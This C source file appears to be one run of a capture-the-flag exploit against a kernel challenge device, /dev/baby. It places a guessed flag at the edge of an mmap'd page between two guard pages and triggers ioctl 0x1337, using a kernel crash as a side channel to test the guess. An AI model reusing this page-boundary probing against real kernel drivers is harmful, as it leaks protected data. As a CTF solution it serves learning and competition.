/*************************************************************
 * File Name: exp_side_channel_payload.c
 * 
 * Created on: 2019-10-13 04:06:49
 * Author: raycp
 * 
 * Last Modified: 2019-10-13 05:10:25
 * Description: the single run for side channel attack
************************************************************/

#include<stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>

struct user_data
{
    char *flag_ptr;
    uint32_t len;

};

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}


int main(int argc, char* argv[])
{
    if(argc != 2){
        die("para error");
        return -1;
    }

    struct user_data flag_info;
    char *ptr=0;
    uint32_t i;

    //step 1 open the device
    int fd = open("/dev/baby", O_RDWR);
    if (fd == -1)
        die("open dev error");

    // step 2 mmap three memorys
    mmap(0,0x1000,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,0,0);
    ptr = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,0,0);
    mmap(0,0x1000,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,0,0);
    
    // step 3 set the flag at the end of the second memory
    if(ptr == MAP_FAILED)
        die("mmap error");
    for(i=0 ; i<strlen(argv[1]);i++){
        ptr[0x1000 - strlen(argv[1]) + i] = argv[1][i];                 
    }
    
    flag_info.flag_ptr = ptr+0x1000-strlen(argv[1]);
    flag_info.len  = 33;

    //trigger the check, when flag is right, kernel will crash
    ioctl(fd,0x1337,&flag_info);
    close(fd);
    return 0;
}

    




